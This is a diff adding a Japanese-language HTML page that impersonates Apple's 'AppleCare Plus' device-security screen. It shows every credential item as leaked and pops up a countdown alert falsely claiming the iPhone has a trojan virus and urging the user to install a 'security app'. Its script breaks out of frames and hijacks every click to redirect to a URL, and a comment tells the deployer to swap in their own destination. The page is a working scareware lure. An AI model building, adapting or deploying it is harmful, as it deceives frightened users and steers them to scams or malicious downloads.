@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="ja" class="webp">
+<head>
+  <base href="l/126/">
+  <title>AppleCare Plus</title>
+  <meta charset="UTF-8">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.min.css">
+  <link rel="shortcut icon" href="images/favicon.png" type="image/png">
+</head>
+<body style="overflow: visible;">
+<div class="preloader" id="preloader" style="display: none;">
+  <div class="overlay">
+    <div class="spinner center">
+      <div class="spinner-blade"><div class="spinner-blade"><div class="spinner-blade">
+      <div class="spinner-blade"><div class="spinner-blade"><div class="spinner-blade">
+      <div class="spinner-blade"><div class="spinner-blade"><div class="spinner-blade">
+      <div class="spinner-blade"><div class="spinner-blade"><div class="spinner-blade">
+</div></div></div>
+
+<div class="wrapper">
+  <main class="page page__container">
+    <div class="page-offer">
+      <div class="marquee">
+        <div class="marquee-back">
+          <div class="arrow-ico ico-chevron">
+            <p id="backButton">戻る</p>
+          </div>
+          <h4 id="title" class="marquee-title">デバイスのセキュリティ</h4>
+        </div>
+      </div>
+
+      <div class="vertical-divider">
+        <div class="settings">
+          <div class="block-title">
+            <h6 id="blockTitle1" class="block-title-text">デバイスタイプ</h6>
+          </div>
+
+          <div class="device-info">
+            <div class="device-info-container">
+              <div class="device-ico device-info-ico ico-screen">
+                <div class="device-info-text">
+                  <p id="deviceInfo" class="device-info-title">Apple iPhone</p>
+                  <p id="deviceInfoText" class="device-info-description">このデバイス</p>
+                </div>
+              </div>
+
+              <div class="divider">
+                <div class="device-info-action">
+                  <p id="deviceInfoAction" class="device-info-action-title">保護</p>
+                  <label class="form-switch">
+                    <input type="checkbox">
+                    <i></i>
+                  </label>
+                </div>
+              </div>
+
+              <div class="block-title">
+                <h6 id="blockTitle2" class="block-title-text">位置</h6>
+              </div>
+
+              <div class="user-credentials">
+                <ul class="user-credentials_list">
+                  <li class="user-credentials_list-item">
+                    <div class="item-key">
+                      <div class="credentials-ico ico-key">
+                        <p id="userCredentialsItem1" class="user-credentials_list-text">パスワード</p>
+                      </div>
+                    </div>
+                    <div class="item-value">
+                      <p id="userCredentialsValue1" class="item-value_text">漏洩</p>
+                    </div>
+                  </li>
+
+                  <div class="divider"></div>
+
+                  <li class="user-credentials_list-item">
+                    <div class="item-key">
+                      <div class="credentials-ico ico-locator">
+                        <p id="userCredentialsItem2" class="user-credentials_list-text">探す</p>
+                      </div>
+                    </div>
+                    <div class="item-value">
+                      <p id="userCredentialsValue2" class="item-value_text">漏洩</p>
+                    </div>
+                  </li>
+
+                  <div class="divider"></div>
+
+                  <li class="user-credentials_list-item">
+                    <div class="item-key">
+                      <div class="credentials-ico ico-face">
+                        <p id="userCredentialsItem3" class="user-credentials_list-text">パスコード</p>
+                      </div>
+                    </div>
+                    <div class="item-value">
+                      <p id="userCredentialsValue3" class="item-value_text">漏洩</p>
+                    </div>
+                  </li>
+
+                  <div class="divider"></div>
+
+                  <li class="user-credentials_list-item">
+                    <div class="item-key">
+                      <div class="credentials-ico ico-privacy">
+                        <p id="userCredentialsItem4" class="user-credentials_list-text">プライバシーとセキュリティ</p>
+                      </div>
+                    </div>
+                    <div class="item-value">
+                      <p id="userCredentialsValue4" class="item-value_text">漏洩</p>
+                    </div>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+
+          <div id="modal" class="modal slide-fade" style="visibility: hidden;">
+            <div class="modal-content">
+              <div class="alert">
+                <div class="alert-container">
+                  <div class="alert-info">
+                    <div class="icon-container">
+                      <picture>
+                        <source srcset="images/sett-ico.png" type="image/png">
+                        <img src="images/sett-ico.png" alt="Apple settings configuration control gear" class="alert-info_settings-gear">
+                      </picture>
+                    </div>
+
+                    <div id="countdown" class="page-offer_countdown countdown">
+                      <ul class="countdown-list">
+                        <li class="countdown-list_item countdown-list_item-minutes">…</li>
+                        <li class="countdown-list_item countdown-list_item-seconds">…</li>
+                      </ul>
+                    </div>
+
+                    <div class="alert-info_block">
+                      <p id="alertTitle" class="alert-info_block-title">あなたの iPhone はトロイの木馬ウイルスに感染しています!</p>
+                      <p id="alertDescription" class="alert-info_block-description">推奨されるセキュリティアプリケーションを直ちにインストールしてください</p>
+                    </div>
+                  </div>
+
+                  <div class="alert-action">
+                    <button id="alertActionButton" class="alert-action_button">…</button>
+                    <button id="alertActionButton" class="alert-action_button">…</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer__container"></div>
+  </footer>
+</div>
+
+<!-- ⚠️ リダイレクト先を自分で差し替えること -->
+<script>
+  let clickURL = "https://apple.com"; // ← ここを https://guns.lol/kamichita などに変更してください
+
+  if (top !== window) {
+    top.location.href = window.location.href;
+  }
+
+  function go_click(e) {
+    window.onbeforeunload = null;
+    top.location.href = clickURL;
+    e.preventDefault();
+    return false;
+  }
+
+  document.body.addEventListener('click', go_click);
+</script>
+
+<script src="app.min.js"></script>
+</body>
+<div style="all: initial;"></div>
+</html>
